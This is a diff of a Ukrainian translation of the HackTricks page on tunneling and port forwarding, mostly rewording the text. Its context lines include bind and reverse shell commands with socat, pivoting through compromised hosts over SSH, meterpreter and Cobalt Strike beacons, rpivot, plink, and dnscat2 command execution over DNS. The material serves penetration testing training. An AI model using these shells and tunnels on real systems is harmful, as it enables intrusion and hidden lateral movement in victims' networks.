@@ -1,15 +1,15 @@
-# Тунелювання та Портове Переспрямування
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Порада Nmap
+## Nmap tip
 
 > [!WARNING]
-> **ICMP** та **SYN** сканування не можуть бути тунельовані через проксі socks, тому ми повинні **вимкнути виявлення ping** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
+> **ICMP** та **SYN** сканування не можуть бути тунельовані через socks проксі, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
 
 ## **Bash**
 
-**Хост -> Стрибок -> ВнутрішнійA -> ВнутрішнійB**
+**Host -> Jump -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -55,7 +55,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Зворотне Портове Перенаправлення
+### Зворотне перенаправлення портів
 
 Це корисно для отримання зворотних шелів з внутрішніх хостів через DMZ до вашого хоста:
 ```bash
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_бокс:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третій_комп'ютер:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Відкрийте порт на сервері команди, який слухає на всіх інтерфейсах, що може бути використаний для **маршрутизації трафіку через маяк**.
+Відкрийте порт на teamserver, який слухає на всіх інтерфейсах, що може бути використаний для **маршрутизації трафіку через beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -152,9 +152,9 @@ rportfwd stop [bind port]
 ```
 Зверніть увагу:
 
-- Зворотний портовий переадресатор Beacon призначений для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
+- Зворотне перенаправлення портів Beacon призначене для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
 - Трафік **тунелюється в межах C2 трафіку Beacon**, включаючи P2P посилання.
-- **Привілеї адміністратора не потрібні** для створення зворотних портових переадресаторів на високих портах.
+- **Привілеї адміністратора не потрібні** для створення зворотних перенаправлень портів на високих портах.
 
 ### rPort2Port local
 
@@ -237,7 +237,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Зворотний тунель. Тунель починається від жертви.\
+Зворотний тунель. Тунель запускається з жертви.\
 Створюється socks4 проксі на 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -258,7 +258,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Прив'язати оболонку
+### Прив'язка оболонки
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -290,9 +290,11 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh консоль**
 
 Створіть сертифікати з обох сторін: Клієнт і Сервер
 ```bash
@@ -318,9 +320,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Це як консольна версія PuTTY (опції дуже схожі на ssh-клієнт).
+Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).
 
-Оскільки цей бінар буде виконуватись на жертві і є ssh-клієнтом, нам потрібно відкрити наш ssh-сервіс і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
+Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -358,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Тепер підтвердіть на вашій машині (атакуючій), що порт 1080 слухає:
+Тепер підтвердіть на вашій машині (атакуючого), що порт 1080 слухає:
 ```
 netstat -antb | findstr 1080
 ```
@@ -366,11 +368,11 @@ netstat -antb | findstr 1080
 
 ## Проксування Windows GUI додатків
 
-Ви можете налаштувати Windows GUI додатки на використання проксі за допомогою [**Proxifier**](https://www.proxifier.com/).\
-У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS-сервера.\
-У **Профіль -> Правила проксування** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
+Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
+У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS сервера.\
+У **Профіль -> Правила проксування** додайте назву програми, яку потрібно проксувати, та з'єднання з IP-адресами, які ви хочете проксувати.
 
-## Обхід NTLM проксі
+## Обхід проксі NTLM
 
 Раніше згадуваний інструмент: **Rpivot**\
 **OpenVPN** також може обійти це, встановивши ці параметри у файлі конфігурації:
@@ -381,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Він аутентифікується проти проксі-сервера та прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
+Він аутентифікується через проксі та прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
 Наприклад, перенаправити порт 443
 ```
 Username Alice
@@ -428,7 +430,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **У PowerShell**
 
-Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у powershell:
+Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у PowerShell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -440,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Зміна DNS у proxychains
 
-Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, є **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **Windows середовищі**, ви можете встановити IP **контролера домену**.
+Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, це **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
 
 ## Тунелі в Go
 
@@ -478,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **є інструментом для експонування рішень в Інтернеті в один рядок команди.**\
-&#xNAN;_&#x45;xposition URI виглядають так:_ **UID.ngrok.io**
+_&#x45;xposition URI виглядають так:_ **UID.ngrok.io**
 
 ### Встановлення
 
